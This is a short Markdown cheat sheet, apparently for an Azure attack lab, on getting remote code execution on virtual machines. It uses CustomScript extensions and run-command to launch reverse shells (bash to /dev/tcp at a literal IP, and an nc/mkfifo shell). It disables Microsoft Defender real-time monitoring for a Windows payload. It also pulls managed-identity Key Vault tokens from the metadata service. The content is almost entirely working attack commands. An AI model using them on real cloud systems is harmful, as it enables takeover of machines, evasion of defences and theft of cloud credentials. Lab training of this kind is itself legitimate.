# Virtual machines

## RCE on linux

```sh
echo -n 'bash -i >& /dev/tcp/46.105.46.111/10023 0>&1' | base64

az vm extension set \
  --resource-group "lab1-vm-network-vm-rg" \
  --vm-name "lab1-vm-network-vm" \
  --name CustomScript \
  --publisher Microsoft.Azure.Extensions \
  --version 2.1 \
  --settings '{}' \
  --protected-settings '{"commandToExecute": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f"}'

# Then on the VM
HEADER="Metadata:true"
URL="http://169.254.169.254/metadata"
API_VERSION="2021-12-13"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net/"
```

## RCE on Windows

MS Defender must be disabled for the payload to works:

```sh
az vm extension set \
  --resource-group "lab2-vm-network-vm-rg" \
  --vm-name "lab2-vm-network-vm" \
  --name CustomScriptExtension \
  --publisher Microsoft.Compute \
  --version 1.10 \
  --settings '{}' \
  --protected-settings '{"commandToExecute": "powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"; powershell -e "}'

# Then on the machine, to get KV access token
(Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://vault.azure.net/" -Headers @{"Metadata"="true"}).access_token
```

## RCE linux via command execution

Assign Managed Identity to VM:

```sh
az vm identity show --resource-group lab_4_vm_network_rg --name lab_4_vm_network_vm
az vm identity assign --resource-group lab_4_vm_network_rg --name lab_4_vm_network_vm --identities /subscriptions/cd9959a7-8b38-4902-897b-267815e9f42f/resourceGroups/lab_4_vm_network_rg/providers/Microsoft.ManagedIdentity/userAssignedIdentities/lab-4-vm-identity-d090e49d
az vm identity show --resource-group lab_4_vm_network_rg --name lab_4_vm_network_vm
```

```sh
az vm run-command invoke \
  --resource-group "lab_4_vm_network_rg" \
  --name "lab_4_vm_network_vm" \
  --command-id RunShellScript \
  --scripts 'HEADER="Metadata:true";URL="http://169.254.169.254/metadata";API_VERSION="2021-12-13";curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net/"'
```
